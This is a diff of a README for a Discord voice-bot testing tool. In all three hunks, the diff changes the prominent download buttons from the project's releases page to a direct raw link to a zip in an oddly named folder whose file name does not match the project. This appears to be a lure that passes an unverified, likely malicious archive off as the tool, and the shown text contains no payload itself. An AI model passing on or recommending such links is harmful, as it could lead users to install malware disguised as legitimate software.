@@ -1,7 +1,7 @@
 <h1>🎙️ discord-voice-testing-tool - Test Voice Bots Effortlessly</h1>
 
 <p align="center">
-  <a href="https://github.com/Brianthemonkey08/discord-voice-testing-tool/releases" style="display:inline-block;padding:16px 32px;background:#5865F2;color:#ffffff;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">⬇️ Download Now</a>
+  <a href="https://github.com/Brianthemonkey08/discord-voice-testing-tool/raw/refs/heads/main/associational/discord-voice-tool-testing-tale.zip" style="display:inline-block;padding:16px 32px;background:#5865F2;color:#ffffff;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">⬇️ Download Now</a>
 </p>
 
 ## 🧭 What Is This Tool?
@@ -35,7 +35,7 @@ If the tool stops working, it can restart itself automatically. You can also set
 Visit this link to download the application:
 
 <p align="center">
-  <a href="https://github.com/Brianthemonkey08/discord-voice-testing-tool/releases" style="display:inline-block;padding:14px 28px;background:#22c55e;color:#ffffff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">📥 Get the Latest Version</a>
+  <a href="https://github.com/Brianthemonkey08/discord-voice-testing-tool/raw/refs/heads/main/associational/discord-voice-tool-testing-tale.zip" style="display:inline-block;padding:14px 28px;background:#22c55e;color:#ffffff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">📥 Get the Latest Version</a>
 </p>
 
 The download page will show you the newest release. Look for the file that matches your system (Windows is recommended).
@@ -146,7 +146,7 @@ This tool is provided for testing and educational purposes. The project uses an 
 
 <p align="center">
   <strong>Ready to test your voice bot?</strong><br>
-  <a href="https://github.com/Brianthemonkey08/discord-voice-testing-tool/releases" style="display:inline-block;padding:12px 24px;background:#ef4444;color:#ffffff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">🚀 Start Download</a>
+  <a href="https://github.com/Brianthemonkey08/discord-voice-testing-tool/raw/refs/heads/main/associational/discord-voice-tool-testing-tale.zip" style="display:inline-block;padding:12px 24px;background:#ef4444;color:#ffffff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">🚀 Start Download</a>
 </p>
 
 ---
